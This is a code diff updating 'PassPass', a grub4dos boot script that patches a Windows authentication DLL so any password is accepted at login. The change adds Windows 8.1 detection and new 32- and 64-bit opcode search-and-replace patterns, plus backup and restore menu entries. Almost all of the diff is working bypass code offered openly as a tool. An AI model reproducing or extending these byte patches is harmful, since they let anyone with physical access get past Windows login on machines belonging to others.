@@ -144,13 +144,14 @@ if "%majmin%"=="5.2" set os=XP 64-bit or Server 2003
 if "%majmin%"=="6.0" set os=Vista or Server 2008
 if "%majmin%"=="6.1" set os=7 or Server 2008 R2
 if "%majmin%"=="6.2" set os=8 or Server 2012
+if "%majmin%"=="6.3" set os=8.1 or Server 2012 R2
 goto :EOF
 
 
 :: Patch or Unpatch?
 :patchUnpatch
-echo -e title iftitle [if exist (bd)/PassPass.bak] Backup  %2/%3%dll% \\nBackup to \\\\PassPass.bak \ndd if=%2/%3%dll% of=(bd)/PassPass.bak \nif not "%^?%"=="0x0" pause \nconfigfile %patchDrv% > %patchDrv%
-echo -e title Restore %2/%3%dll% \\nRestore from \\\\PassPass.bak \ndd of=%2/%3%dll% if=(bd)/PassPass.bak \nif "%?%"=="1" pause \nconfigfile %patchDrv% >> %patchDrv%
+echo -e iftitle [if exist (bd)/PassPass.bak] Backup %2/%3%dll% \\nBackup to \\\\PassPass.bak \ndd if=%2/%3%dll% of=(bd)/PassPass.bak \nif not "%^?%"=="0x0" pause \nconfigfile %patchDrv% > %patchDrv%
+echo -e iftitle [if exist (bd)/PassPass.bak] Restore %2/%3%dll% \\nRestore from \\\\PassPass.bak \ndd of=%2/%3%dll% if=(bd)/PassPass.bak \nif "%?%"=="1" pause \nconfigfile %patchDrv% >> %patchDrv%
 echo -e title Patch Windows on %2\\\\%3 \\n \ncall %0 patchDLL %2 %3 \npause \nconfigfile %patchDrv% >> %patchDrv%
 echo -e title UnPatch Windows on %2\\\\%3 \\n \ncall %0 unPatchDLL %2 %3 \npause \nconfigfile %patchDrv% >> %patchDrv%
 echo -e title Back to OS detection menu \nconfigfile %osDrv% \npause \nconfigfile %osDrv% >> %patchDrv%
@@ -171,12 +172,14 @@ if "%@retval%"=="1" goto :64BitPatch
 set patt=\x83\xF8\x10
 set rpatt=\x33\xC0\x90
 if "%majmin%"=="6.2" set patt=\x3B\xC6\x75\x13 && set rpatt=\x33\xC0\x75\x13
+if "%majmin%"=="6.3" set patt=\x4d\x3b\xc6\x0F\x85 && set rpatt=\x4d\x33\xc0\x0F\x85
 goto :DoPatch
 
 :64BitPatch
 set patt=\x48\x3B\xC6\x0F\x85
 set rpatt=\x33\xC0\x90\x0F\x85
 if "%majmin%"=="6.2" set patt=\x49\x3B\xC6\x0F\x85 && set rpatt=\x33\xC0\x90\x0F\x85
+if "%majmin%"=="6.3" set patt=\x49\x3B\xC6\x0F\x85 && set rpatt=\x33\xC0\x90\x0F\x85
 
 :DoPatch
 :: Check whether we can unpatch
@@ -204,12 +207,14 @@ if "%@retval%"=="1" goto :64BitUnpatch
 set patt=\x83\xF8\x10
 set rpatt=\x33\xC0\x90
 if "%majmin%"=="6.2" set patt=\x3B\xC6\x75\x13 && set rpatt=\x33\xC0\x75\x13
+if "%majmin%"=="6.3" set patt=\x4d\x3b\xc6\x0F\x85 && set rpatt=\x4d\x33\xc0\x0F\x85
 goto :DoUnpatch
 
 :64BitUnpatch
 set patt=\x48\x3B\xC6\x0F\x85
 set rpatt=\x33\xC0\x90\x0F\x85
 if "%majmin%"=="6.2" set patt=\x49\x3B\xC6\x0F\x85 && set rpatt=\x33\xC0\x90\x0F\x85
+if "%majmin%"=="6.3" set patt=\x49\x3B\xC6\x0F\x85 && set rpatt=\x33\xC0\x90\x0F\x85
 
 :DoUnpatch
 cat --hex --locate=%rpatt% --replace=%patt% %dllPath% > nul
@@ -224,7 +229,7 @@ goto :EOF
 
 
 :help
-echo -e \nPassPass v1.1 - Idea by jaclaz, Coded by Sherlock
+echo -e \nPassPass v1.2 - Idea by jaclaz, Coded by Sherlock
 echo Released under the jaclaz's CAREWARE license
 echo -e \nUsage: PassPass.g4b [BOOTDEV] | [<MaxDisk#> <MaxPartition#>]\n
 echo By default, PassPass tries to search for Windows installations
